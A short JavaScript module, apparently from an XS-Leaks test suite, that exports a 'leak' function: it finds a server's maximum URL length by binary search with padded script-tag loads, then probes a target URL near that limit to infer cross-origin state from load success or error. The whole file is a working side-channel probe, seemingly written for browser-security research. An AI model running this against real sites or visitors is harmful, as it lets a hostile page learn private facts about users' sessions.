let URL_LIMIT = 10000

const checkLoad = async (url) => {
    return new Promise((r, e)=>{
        let s = document.createElement('script');
        s.src = url;
        s.onload = (e) => {
            e.target.remove()
            return r(true)
        };
        s.onerror = (e) => {
            e.target.remove()
            return r(false)
        }
        document.head.appendChild(s);
    });
}

const genUrl = (url, n) => {
    let seperator = url.includes('?') ? '&foo=' : '?foo='
    let endMarker = 'END'
    let l  = n - url.length - seperator.length - endMarker.length
    let newUrl = url + seperator + 'a'.repeat(l) + endMarker
    if(newUrl.length !== n){
        console.debug(`[!] ${newUrl.length} !== ${n}`)
    }
    return newUrl

}

const calibrate = async (url) =>  {
    let l = 0, r = URL_LIMIT, m = 0, res = false
    while (l < r) {
        m = Math.floor((l + r) / 2)
        res = await checkLoad(genUrl(url, m))
        if(res === false){
            r = m - 1
        }
        else{
            l = m + 1
        }

    }
    // check it again
    res = await checkLoad(genUrl(url, l))
    if(res === false){
        l--
    }
    res = await checkLoad(genUrl(url, l))
    if(res === false){
        console.debug('Error after last check !!!')
        return 0
    }
    console.debug(`DONE: length: ${l}, result: ${res}`)
    return l

}

const getOrigin = (url) => {
    let l = document.createElement('a')
    l.href = url
    return l.origin
}

const leak = async (url) => {
    return new Promise(async(r) => {
        // test server at / and set limit
        let max = await calibrate(getOrigin(url) + '/testcases/tests/blank.php')
        // check url with new limit
        let x = 3
        // url will be at least x longer to trigger error
        let res = await checkLoad(genUrl(url, max-x))
        if(res){
            return r(0)
        }
        else{
            return r(1)
        }
    })
}

export { leak }